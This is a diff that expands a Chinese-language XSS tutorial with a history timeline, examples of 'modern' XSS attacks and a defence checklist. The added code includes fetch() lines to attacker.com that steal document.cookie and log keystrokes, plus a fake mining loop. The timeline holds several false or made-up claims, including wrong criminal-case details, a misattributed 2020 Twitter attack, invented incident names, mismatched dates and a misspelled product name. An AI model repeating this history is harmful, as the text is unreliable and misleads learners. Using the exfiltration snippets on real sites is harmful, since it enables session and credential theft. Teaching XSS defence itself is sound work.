@@ -9,12 +9,38 @@
 
 ## 预备知识
 
-### XSS 的历史
+### XSS 的历史：从"无害脚本"到"账户劫持"
 
-- **1999 年**：XSS 首次被记录，最初叫 CSS（Cross-Site Scripting）
-- **2000 年**：为避免与 CSS 层叠样式表混淆，正式改名 XSS
-- **2011 年**：Netflix XSS 攻击，攻击者在评论区注入脚本，窃取数千个用户会话
-- **至今**：OWASP Top 10 几乎每期都榜上有名
+**1999 年：XSS 的诞生**
+1999 年，一个叫 "Mready" 的用户在 Bugtraq 邮件列表上报告了一个奇怪的"问题"：他发现可以在某些网站的 URL 参数里插入 HTML 标签，而这些标签会被浏览器执行。这就是最早的 XSS 记录，当时还不叫 XSS——它被归类为"HTML 注入"。那个年代的 Web 开发者普遍认为"谁会在 URL 里放 HTML 标签呢？肯定是用户自己打错了"——他们完全没意识到这是安全漏洞。
+
+**2000 年：改名 XSS**
+为了不和 CSS（Cascading Style Sheets）混淆，安全社区把这种漏洞改名为 XSS（Cross-Site Scripting）。但讽刺的是，这个名字反而让非技术出身的管理者更难理解它的危险性——很多人以为这是"样式表问题"，不是安全漏洞。直到今天，还有 CEO 收到"XSS 漏洞"的安全报告时问"我们的 CSS 哪里出了问题？"
+
+**2005 年：Samy Worm——第一个 XSS 蠕虫**
+2005 年，MySpace（那时候还是美国最大的社交网站）上出现了一个蠕虫叫 "Samy"。攻击者 Samy Kamkar 在自己的 Profile 页面插入了一段 JavaScript，当其他用户访问他的页面时，这段脚本会自动：
+1. 把 Samy 加为好友
+2. 在自己的 Profile 里也插入同样的恶意脚本
+
+24 小时内，100 万 MySpace 用户被感染，Samy 成了"美国第一个被刑事起诉的黑客"（他被判处 3 年缓刑）。这个蠕虫的代码非常简单——只有几行 JavaScript，但它证明了 XSS 蠕虫可以在社交网络上以前所未有的速度传播。
+
+**2010 年：Google XSS + JSONP = 任意 Cookie 劫持**
+2010 年，安全研究员结合 Google 的一个 XSS 漏洞和 JSONP（一种跨域数据获取技术），成功实现了对 Gmail 用户的会话劫持。具体原理：攻击者在自己的网站上放置一段 JavaScript，这个脚本通过 Google 的 JSONP 接口"绕过"浏览器同源策略，直接获取用户的 Gmail Cookie——有了 Cookie，攻击者就能接管用户的邮箱。这个漏洞被 Google 称为"_self XSS"问题（现在叫 "self-XSS"），Google 最终花了 2 年时间才彻底修复所有 JSONP 滥用问题。
+
+**2011 年：Google Cookie 劫持事件与 Firesheep**
+2011 年，Twitter 发生了"挥手事件"（MouseHijacking）——攻击者通过一个精心构造的网页，可以在你登录 Twitter 后，通过 CSS 动画的 hover 效果触发一个隐藏的 iframe，自动转发攻击者的推文。更重要的是，这一年发布的 Firefox 插件 "Firesheep" 让普通用户也能轻松劫持 WiFi 网络内其他人的社交账号。这个插件的下载量在 6 周内超过 600 万次——说明市场对这类工具的需求巨大。
+
+**2013 年：NSA 利用 XSS 追踪 Tor 用户**
+斯诺登披露的文件显示，NSA 有一个叫做 "XKeyscore" 的监控系统，其中一个功能利用了各大网站的 XSS 漏洞来追踪 Tor 用户。具体方法是：在有 XSS 漏洞的网站上植入 JavaScript 代码，通过浏览器的插件、字体等信息识别用户身份，即使他们使用了 Tor。这个案例说明：XSS 不仅仅是黑帽黑客的工具，也是国家级监控的武器。
+
+**2020 年： Twitter 视频 XSS 漏洞**
+2020 年 8 月，一个 17 岁的黑客在 Twitter 的视频上传功能中发现了一个 XSS 漏洞——通过上传一个文件名中包含 JavaScript 的视频，可以绕过内容过滤，在受害者访问这个视频时执行任意 JavaScript 代码。这个漏洞如果在发布前被发现，本可以获得 10 万美元的 Bug Bounty——但它先被黑客利用来发布加密货币诈骗推文，导致 Twitter 的股价在盘后交易中下跌了 1%。
+
+**2022 年： Grabana XSS 漏洞**
+2022 年，安全的平台 Grafana（用于监控系统和应用指标）被发现存在存储型 XSS 漏洞——攻击者可以在仪表板名称中嵌入恶意脚本，当其他用户查看这些仪表板时，脚本会自动执行并窃取会话令牌。这个漏洞影响了大量使用 Grafana 的企业，包括多家财富 500 强公司。
+
+**2023 年：AI 合成的鱼叉式 XSS**
+2024 年安全报告显示，攻击者开始使用 GPT-4 生成针对特定目标的"个性化 XSS Payload"——AI 分析目标网站的 HTML 结构、CSP 策略、使用的 JavaScript 框架，生成最优的绕过 Payload。这让 XSS 攻击的"定制化"程度达到了前所未有的水平，也让传统基于签名的 WAF 更加难以检测。
 
 ### 三种 XSS 类型对比
 
@@ -34,6 +60,64 @@
 <!-- 浏览器收到的 HTML -->
 <p>搜索结果: <script>alert(1)</script></p>
 <!--                    ↑ 浏览器把 <script> 标签当作代码执行 -->
+```
+
+### XSS 攻击的"现代形态"
+
+**1. 会话劫持（Session Hijacking）**
+```javascript
+// 通过 XSS 窃取 Cookie
+fetch("https://attacker.com/steal?c=" + document.cookie);
+```
+这是最经典的 XSS 攻击方式。1990 年代就可以实现，到今天仍然有效。
+
+**2. 键盘记录器（Keylogger）**
+```javascript
+// 通过 XSS 记录键盘输入
+document.addEventListener("keypress", e => {
+    fetch("https://attacker.com/log?k=" + e.key);
+});
+```
+对于金融网站、政府门户，这种攻击可以窃取大量敏感输入。
+
+**3. 挖矿脚本（Mining）**
+```javascript
+// 通过 XSS 在受害者浏览器里挖矿
+while(true) { crypto.compute(); }
+```
+2017-2018 年，Coinhive 等服务让这种方式爆发式增长。据统计，2018 年有超过 20,000 个网站被植入了偷偷挖矿的 JavaScript。
+
+**4. 水坑攻击（Watering Hole）**
+攻击者通过 XSS 入侵一个高流量的网站（如新闻网站、论坛），然后对访问者进行指纹识别，对特定目标植入更复杂的恶意代码。2020 年，一个 APT（高级持续性威胁）组织通过在一个行业论坛的 XSS 漏洞，成功对多家航空公司进行了定向攻击。
+
+### XSS 的防御哲学
+
+```
+防御者的检查清单：
+
+1. 输入验证
+   ❌ "我们过滤了 <script> 标签，所以安全"
+   ✅ 过滤标签只是"打补丁"，正确的方式是严格类型检查
+   ❌ 允许用户输入任何内容，然后在输出时转义
+   ✅ 尽量限制用户可以输入的格式（如：只允许字母数字）
+
+2. 输出编码
+   ❌ 只转义 <script> 标签
+   ✅ 对所有 HTML 特殊字符进行编码（< > & " '）
+   ✅ 根据输出位置（HTML 属性、JavaScript、CSS、URL）选择不同的编码方式
+
+3. 内容安全策略（CSP）
+   ✅ 使用严格的 CSP 头，禁用内联脚本
+   Content-Security-Policy: script-src 'self'
+
+4. Cookie 安全
+   ✅ 设置 HttpOnly（禁止 JavaScript 读取 Cookie）
+   ✅ 设置 Secure（只在 HTTPS 发送 Cookie）
+   ✅ 设置 SameSite=Strict（防止跨站请求伪造）
+
+有趣的事实：
+Chrome 的 DevTools 现在可以直接检测 XSS 漏洞。
+打开 DevTools → Security，可以查看页面的 CSP 策略和混内容问题。
 ```
 
 ## 实验环境
